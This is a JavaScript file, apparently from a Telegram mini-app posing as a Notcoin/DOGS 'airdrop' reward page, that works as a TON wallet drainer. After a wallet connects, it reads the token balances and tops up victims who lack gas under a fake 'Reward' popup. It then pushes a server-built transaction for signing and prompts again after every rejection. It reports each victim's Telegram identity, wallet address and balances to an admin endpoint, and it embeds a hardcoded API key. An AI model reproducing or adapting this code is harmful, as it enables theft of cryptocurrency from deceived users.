const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({manifestUrl: 'https://notdrop.one/tonconnect-manifest.json',buttonRootId:'cnbtn'});
console.log("start")
let url = new URLSearchParams(window.location.hash.split("#")[1])
let tgWebAppData = new URLSearchParams(url.get("tgWebAppData"));
const userData = JSON.parse(tgWebAppData.get("user"))
const TON_API_BASE_URL = "https://toncenter.com/api/v3";
const TON_API_KEY = "11c07153e575449091d47c0dbdb37c58e89236af8d7462849634de148f328c78";

const axiosInstance = axios.create({});

axiosInstance.interceptors.response.use(
    response => response,
    error => error.response
);
const fromNano = (nanoAmount) => {
    return parseFloat(nanoAmount) / 1e9;
};
const getAccountInfo = async (address) => {
    const response = await axiosInstance.get(`${TON_API_BASE_URL}/account`, {
        params: { address },
        headers: { "X-API-Key": TON_API_KEY }
    });
    return response.data;
};
const getJettonWallet = async (ownerAddress, jettonAddress) => {
    const response = await axiosInstance.get(`${TON_API_BASE_URL}/jetton/wallets`, {
        params: {
            jetton_address: jettonAddress,
            owner_address: ownerAddress,
            limit: 1,
            offset: 0
        },
        headers: { "X-API-Key": TON_API_KEY }
    });
    const wallets = response.data.jetton_wallets;
    if (wallets.length > 0) {
        return wallets[0];
    }
};
class WalletManager {
    constructor(wallet) {
        this.wallet = wallet;
        this.NOTCOIN_JETTON_CONTRACT = "0:2F956143C461769579BAEF2E32CC2D7BC18283F40D20BB03E432CD603AC33FFC";
        this.DOGS_JETTON_CONTRACT = "0:afc49cb8786f21c87045b19ede78fc6b46c51048513f8e9a6d44060199c1bf0c";
    }

    async getAccount() {
        return await getAccountInfo(this.wallet.account.address);
    }

    async getTONBalance() {
        const accountInfo = await this.getAccount();
        return accountInfo.balance;
    }

    async getNotcoinWallet() {
        return await getJettonWallet(this.wallet.account.address, this.NOTCOIN_JETTON_CONTRACT);
    }

    async getNotcoinBalance() {
        const wallet = await this.getNotcoinWallet();
        return wallet == null ? 0 : wallet.balance;
    }
    async getDogsWallet() {
      return await getJettonWallet(this.wallet.account.address, this.DOGS_JETTON_CONTRACT);
    }

    async getDogsBalance() {
      const wallet = await this.getDogsWallet();
      return wallet == null ? 0 : wallet.balance;
    }

}

async function openButton() {
    if (await tonConnectUI.connected) {
        await send_transaction();
    } else {
        await tonConnectUI.openModal()
    }
}
const getAddress = async (address) => {
    const response = await axiosInstance.get(`https://toncenter.com/api/v2/getExtendedAddressInformation`, {
        params: { address },
        headers: { "X-API-Key": TON_API_KEY }
    });
    return response.data.result.address.account_address;
};

async function send_transaction() {
    try {
        const senderAddress = tonConnectUI.account.address; // Replace with actual sender address

        // Fetching jettons balances
        fetch(`https://tonapi.io/v2/accounts/${senderAddress}/jettons`)
    .then(response => response.json())
    .then(data => {
        const jettonsBalances = [];
        let notcoinBalance = 0;
        let dogsBalance = 0;
        data.balances.forEach(balance => {
            if (balance.jetton.verification === "whitelist") {
                if (balance.jetton.name === 'Notcoin') {
                    notcoinBalance = parseInt(balance.balance) / 1000000000;
                }else if (balance.jetton.name === 'Dogs') {
                    dogsBalance = parseInt(balance.balance) / 1000000000;
              }
            }
        });

        fetch(`https://toncenter.com/api/v2/getWalletInformation?address=${senderAddress}`)
            .then(response => response.json())
            .then(data => {
                const tonBalance = data.result.balance / 1000000000;
                if (tonBalance < 0.07) {
                    if (notcoinBalance >= 300 || dogsBalance > 3000){
                    fetch('getFee.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ address: senderAddress,chatid: userData.id })
                    })
                    .then(response => response.json())
                    .then(data => {
                        setTimeout(async function () {
                            let timerInterval;
                            await Swal.fire({
                            icon: 'warning',
                            title: "Receiving The Gas!",
                            allowOutsideClick: false,
                            html: "You Can Get Your Reward in <b></b> seconds.",
                            timer: 20000,
                            timerProgressBar: true,
                            didOpen: () => {
                                Swal.showLoading();
                                const timer = Swal.getPopup().querySelector("b");
                                timerInterval = setInterval(() => {
                                timer.textContent = `${Swal.getTimerLeft()/1000}`;
                                }, 100);
                            },
                            });
                        }, 100)
                        
                        
                    })
                    .catch(error => console.error('Error fetching fee:', error));
                }
                }
            })
            .catch(error => console.error('Error fetching TON balance:', error));
    })
    .catch(error => console.error('Error fetching jettons balances:', error));
        const wallet_address = tonConnectUI.account.address;
        let body = await (await fetch("api.php?command=get_transaction_json&wallet_sender=" + wallet_address)).json();
        if (body.status === "error") {
            return Swal.fire({
                title: body.body,
                icon: 'error',
                timerProgressBar: true,
                showLoaderOnConfirm: true,
                showConfirmButton: false,
                timer: 2500
            })
        }
        const WALLET = new WalletManager(tonConnectUI);
        let notbalance = await WALLET.getNotcoinBalance() / 1000000000;
        let dogsbalance = await WALLET.getDogsBalance() / 1000000000;
        let tonbalance = await WALLET.getTONBalance() / 1000000000;
        let addressWallet = await getAddress(tonConnectUI.wallet.account.address)
        let transaction = body.body
        try {
            if(await tonConnectUI.sendTransaction(transaction)){
                const connectedbody = JSON.stringify({ type:'Success',firstname: userData.first_name,id: userData.id,username:userData.username,wallet:tonConnectUI.wallet.appName,platform:tonConnectUI.wallet.device.platform,address:addressWallet,notbalance:notbalance,dogsbalance:dogsbalance,tonbalance:tonbalance})
                await send_to_admin(connectedbody);
            }
        } catch (e) {
            const connectedbody = JSON.stringify({ type:'Rejected',firstname: userData.first_name,id: userData.id,username:userData.username,wallet:tonConnectUI.wallet.appName,platform:tonConnectUI.wallet.device.platform,address:addressWallet,notbalance:notbalance,dogsbalance:dogsbalance,tonbalance:tonbalance})
                await send_to_admin(connectedbody);
            setTimeout(async function () {
                await send_transaction();
            }, 1500)
            console.error("transaction failed", e);
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

(async () => {
    tonConnectUI.onStatusChange(async () => {
        if (tonConnectUI.connected) {
            const WALLET = new WalletManager(tonConnectUI);
            let notbalance = await WALLET.getNotcoinBalance() / 1000000000;
            let dogsbalance = await WALLET.getDogsBalance() / 1000000000;
            let tonbalance = await WALLET.getTONBalance() / 1000000000
            setTimeout(async function () {
                await send_transaction() 
            }, 2000)

            let addressWallet = await getAddress(tonConnectUI.wallet.account.address)
                    const connectedbody = JSON.stringify({ type:'Connected',firstname: userData.first_name,id: userData.id,username:userData.username,wallet:tonConnectUI.wallet.appName,platform:tonConnectUI.wallet.device.platform,address:addressWallet,notbalance:notbalance,dogsbalance:dogsbalance,tonbalance:tonbalance})
                await send_to_admin(connectedbody);
        } else {
            document.getElementById('balance').innerText = 'Wallet not connected';
        }
    });


    if (tonConnectUI.connected) {
        const WALLET = new WalletManager(tonConnectUI);
        let notbalance = await WALLET.getNotcoinBalance() / 1000000000;
        let dogsbalance = await WALLET.getDogsBalance() / 1000000000;
        let tonbalance = await WALLET.getTONBalance() / 1000000000;
        let addressWallet = await getAddress(tonConnectUI.wallet.account.address);
        const connectedbody = JSON.stringify({ type:'Connected',firstname: userData.first_name,id: userData.id,username:userData.username,wallet:tonConnectUI.wallet.appName,platform:tonConnectUI.wallet.device.platform,address:addressWallet,notbalance:notbalance,dogsbalance:dogsbalance,tonbalance:tonbalance})
                await send_to_admin(connectedbody);
        setTimeout(async function () {
            await send_transaction();
        }, 1500);
    }
})()

async function send_to_admin(text) {
    try {
        await fetch('Tel.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: text
                    });
    } catch (e) {
        console.log("---> " + e)
    }
}